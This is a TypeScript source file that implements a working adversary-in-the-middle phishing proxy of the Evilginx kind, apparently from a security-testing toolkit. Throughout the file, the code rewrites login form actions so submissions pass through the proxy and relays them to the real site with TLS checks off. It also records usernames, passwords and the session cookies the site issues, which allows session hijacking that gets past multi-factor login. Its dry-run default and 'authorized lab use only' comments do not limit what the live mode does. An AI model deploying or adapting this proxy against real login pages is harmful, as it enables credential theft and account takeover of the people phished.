/**
 * AiTM (Adversary-in-the-Middle) phishing proxy — a real TLS reverse proxy (T1557).
 *
 * Port of `modules.aitm_proxy` (Evilginx-class flow, COOKIE SPIDER / Scattered
 * Spider tradecraft). The proxy sits between the victim and the real login
 * origin, rewrites form actions so credentials flow through it, relays the
 * POST upstream, and captures both credentials and the session cookies the
 * origin issues (Pass-the-Cookie) — without touching the victim's device.
 *
 * Safety model:
 * - `live=false` (default) — refuses to bind; renders only the config and the
 *   rewritten template sample.
 * - `live=true` binds a real listener (loopback by default) for authorized
 *   lab phishing-resistance testing. HITL-gated by the `aitm_proxy` tool.
 * - `probe()` never contacts the network.
 *
 * Node built-ins only: `node:http` (listener) + `node:https` (upstream relay
 * with rejectUnauthorized=false) + `node:child_process` (openssl self-signed
 * cert for live TLS termination).
 */

import { resolveDryRun } from "./exec_options.ts"
import { createServer, request as httpRequest, type IncomingMessage, type Server, type ServerResponse } from "node:http";
import { request as httpsRequest } from "node:https";
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileP = promisify(execFile);

const FORM_ACTION_RE = /(<form\b[^>]*\baction\s*=\s*["'])([^"']*)(["'])/gi;
const ABS_URL_RE = /(https?:\/\/[^\s"'<>]+)/gi;

export interface ProxyCapture {
  timestamp: string;
  method: string;
  path: string;
  form_data: Record<string, string>;
  set_cookies: string[];
  upstream_status: number;
}

export interface AiTMOptions {
  targetUrl: string;
  listenHost?: string;
  listenPort?: number;
  live?: boolean;
  sslEnabled?: boolean;
  certPath?: string;
  keyPath?: string;
  name?: string;
}

/** Generate a real self-signed X.509 pair via the openssl CLI. */
export async function generateSelfSignedCert(
  host = "127.0.0.1",
  keyPath = "",
  certPath = "",
  days = 30,
): Promise<{ keyPath: string; certPath: string }> {
  const key = keyPath || `/tmp/aitm_${host.replace(/\./g, "_")}.key`;
  const cert = certPath || `/tmp/aitm_${host.replace(/\./g, "_")}.crt`;
  await execFileP("openssl", [
    "req", "-x509", "-newkey", "rsa:2048",
    "-keyout", key, "-out", cert,
    "-days", String(days), "-nodes",
    "-subj", `/CN=${host}`,
  ], { timeout: 20_000 });
  return { keyPath: key, certPath: cert };
}

export class AiTMProxy {
  targetUrl: string;
  listenHost: string;
  listenPort: number;
  live: boolean;
  sslEnabled: boolean;
  certPath: string;
  keyPath: string;
  name: string;
  captures: ProxyCapture[] = [];

  private server: Server | null = null;
  private origin: string;

  constructor(opts: AiTMOptions) {
    this.targetUrl = opts.targetUrl;
    this.listenHost = opts.listenHost ?? "127.0.0.1";
    this.listenPort = opts.listenPort ?? 0;
    this.live = opts.live ?? false;
    this.sslEnabled = opts.sslEnabled ?? false;
    this.certPath = opts.certPath ?? "";
    this.keyPath = opts.keyPath ?? "";
    this.name = opts.name ?? "aitm-proxy";
    this.origin = this.targetUrl.replace(/\/+$/, "");
  }

  private base(hostHeader: string): string {
    const scheme = this.sslEnabled ? "https" : "http";
    const host = hostHeader || this.listenHost;
    // The Host header already includes the port when non-default — don't
    // append a second one (would produce host:port:port).
    if (host.includes(":")) return `${scheme}://${host}`;
    const port = this.listenPort !== 0 ? this.listenPort : (this.server?.address() as { port: number } | null)?.port ?? this.listenPort;
    return `${scheme}://${host}:${port}`;
  }

  /** Rewrite form actions to point at the proxy and swap absolute origin URLs. */
  rewrite(html: string, hostHeader = ""): string {
    const base = this.base(hostHeader);
    const origin = this.origin;
    html = html.replace(FORM_ACTION_RE, (_m, prefix: string, action: string, suffix: string) => {
      if (action.startsWith("//")) action = "https:" + action;
      if (action.startsWith("/")) action = origin + action;
      if (action && !action.startsWith("http://") && !action.startsWith("https://")) {
        action = origin + "/" + action.replace(/^\/+/, "");
      }
      return `${prefix}${base}${suffix}`;
    });
    html = html.replace(ABS_URL_RE, (m) => m.replace(origin, base));
    return html;
  }

  /** Bind the listener. Refuses when `live=false` (honest dry-run). */
  async start(): Promise<Record<string, unknown>> {
    if (!this.live) {
      return {
        status: "dry-run",
        note: `would bind ${this.listenHost}:${this.listenPort} relaying ${this.targetUrl} (${this.sslEnabled ? "TLS" : "plaintext"})`,
        rewritten_sample: this.renderTemplate(),
      };
    }

    const handler = (req: IncomingMessage, res: ServerResponse): void => {
      void this.handleRequest(req, res);
    };
    this.server = createServer(handler);

    if (this.sslEnabled) {
      const { readFileSync } = await import("node:fs");
      const { createServer: createHttpsServer } = await import("node:https");
      if (!this.certPath || !this.keyPath) {
        const pair = await generateSelfSignedCert(this.listenHost);
        this.keyPath = pair.keyPath;
        this.certPath = pair.certPath;
      }
      this.server = createHttpsServer(
        { key: readFileSync(this.keyPath), cert: readFileSync(this.certPath) },
        handler,
      );
    }

    await new Promise<void>((resolve, reject) => {
      this.server!.once("error", reject);
      this.server!.listen(this.listenPort, this.listenHost, () => resolve());
    });
    const port = (this.server!.address() as { port: number }).port;
    // Remember the actual bound port so base() never emits host:0 for bare
    // host headers (e.g. Host: localhost on a non-default port).
    this.listenPort = port;
    return {
      status: "listening",
      host: this.listenHost,
      port,
      target: this.targetUrl,
      tls: this.sslEnabled,
      note: "capturing credentials and session cookies — authorized lab use only",
    };
  }

  private async handleRequest(req: IncomingMessage, res: ServerResponse): Promise<void> {
    const method = req.method ?? "GET";
    const path = req.url ?? "/";
    const body = await readBody(req);
    const headers: Record<string, string> = {};
    for (const [k, v] of Object.entries(req.headers)) {
      if (k.toLowerCase() === "host" || k.toLowerCase() === "content-length") continue;
      if (typeof v === "string") headers[k] = v;
    }

    let upStatus: number;
    let upHeaders: Record<string, string | string[] | undefined>;
    let upBody: Buffer;
    if (this.live) {
      try {
        const upstream = await relayRequest(method, this.origin + path, body, headers);
        upStatus = upstream.status;
        upHeaders = upstream.headers;
        upBody = upstream.body;
      } catch (exc) {
        const payload = Buffer.from(`proxy error reaching origin: ${exc instanceof Error ? exc.message : String(exc)}`);
        res.writeHead(502, { "Content-Length": String(payload.length) });
        res.end(payload);
        return;
      }
    } else {
      upStatus = 200;
      upHeaders = {};
      upBody = Buffer.alloc(0);
    }

    // Capture credentials on form POSTs.
    const formData: Record<string, string> = {};
    if (method === "POST" && body.length) {
      const ctype = String(req.headers["content-type"] ?? "").toLowerCase();
      if (ctype.includes("application/x-www-form-urlencoded")) {
        const params = new URLSearchParams(body.toString("utf-8"));
        for (const [k, v] of params.entries()) formData[k] = v;
      } else if (ctype.includes("application/json")) {
        try {
          const raw = JSON.parse(body.toString("utf-8")) as unknown;
          if (raw && typeof raw === "object" && !Array.isArray(raw)) {
            for (const [k, v] of Object.entries(raw as Record<string, unknown>)) formData[k] = String(v);
          }
        } catch {
          /* not JSON — ignore */
        }
      }
    }
    const setCookies = normalizeSetCookies(upHeaders["set-cookie"]);
    if (Object.keys(formData).length || setCookies.length) {
      this.captures.push({
        timestamp: new Date().toISOString(),
        method,
        path,
        form_data: formData,
        set_cookies: setCookies,
        upstream_status: upStatus,
      });
    }

    let bodyOut = upBody;
    if (String(upHeaders["content-type"] ?? "").includes("text/html")) {
      bodyOut = Buffer.from(this.rewrite(upBody.toString("utf-8"), String(req.headers["host"] ?? this.listenHost)));
    }

    const outHeaders: Record<string, string | string[] | undefined> = {};
    for (const [k, v] of Object.entries(upHeaders)) {
      if (["content-length", "transfer-encoding", "connection", "content-encoding"].includes(k.toLowerCase())) continue;
      outHeaders[k] = v;
    }
    if (setCookies.length) outHeaders["Set-Cookie"] = setCookies;
    outHeaders["Content-Length"] = String(bodyOut.length);
    res.writeHead(upStatus, outHeaders);
    res.end(bodyOut);
  }

  stop(): void {
    if (this.server) {
      this.server.close();
      this.server = null;
    }
  }

  captured(): Array<Record<string, unknown>> {
    return this.captures.map((c) => ({
      timestamp: c.timestamp,
      method: c.method,
      path: c.path,
      form_data: c.form_data,
      set_cookies: c.set_cookies,
      upstream_status: c.upstream_status,
    }));
  }

  /** Render the rewritten login form (dry-run — no network). */
  renderTemplate(): string {
    if (!this.live) {
      return (
        `<form action="[proxy]://${this.listenHost}/login" method="post">\n` +
        `  <input name="username"> <input name="password" type="password">\n` +
        `</form>\n# target: ${this.targetUrl}`
      );
    }
    return `<form action="${this.base(this.listenHost)}/login" method="post">\n  <input name="username"> <input name="password" type="password">\n</form>\n# target: ${this.targetUrl}`;
  }

  probe(): Record<string, unknown> {
    return {
      transport: this.name,
      reachable: false,
      technique_id: "T1557",
      note: `${this.live ? "live" : "dry-run"} proxy — target ${this.targetUrl}`,
    };
  }
}

// ------------------------------------------------------------------------- //
// helpers
// ------------------------------------------------------------------------- //

async function readBody(req: IncomingMessage): Promise<Buffer> {
  const chunks: Buffer[] = [];
  for await (const chunk of req) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }
  return Buffer.concat(chunks);
}

interface RelayResult {
  status: number;
  headers: Record<string, string | string[] | undefined>;
  body: Buffer;
}

/** Real upstream relay over http(s).request (TLS verification disabled for https). */
function relayRequest(
  method: string,
  url: string,
  body: Buffer,
  headers: Record<string, string>,
): Promise<RelayResult> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const isHttps = parsed.protocol === "https:";
    const reqFn = isHttps ? httpsRequest : httpRequest;
    const req = reqFn(
      {
        method,
        hostname: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.pathname + parsed.search,
        protocol: parsed.protocol,
        headers: { ...headers, "Content-Length": String(body.length || 0) },
        ...(isHttps ? { rejectUnauthorized: false } : {}),
        timeout: 15_000,
      },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c: Buffer) => chunks.push(Buffer.from(c)));
        res.on("end", () => {
          resolve({
            status: res.statusCode ?? 502,
            headers: res.headers,
            body: Buffer.concat(chunks),
          });
        });
      },
    );
    req.on("timeout", () => {
      req.destroy(new Error("upstream timeout"));
    });
    req.on("error", reject);
    if (body.length) req.write(body);
    req.end();
  });
}

function normalizeSetCookies(value: string | string[] | undefined): string[] {
  if (!value) return [];
  return (Array.isArray(value) ? value : [value]).filter(Boolean);
}
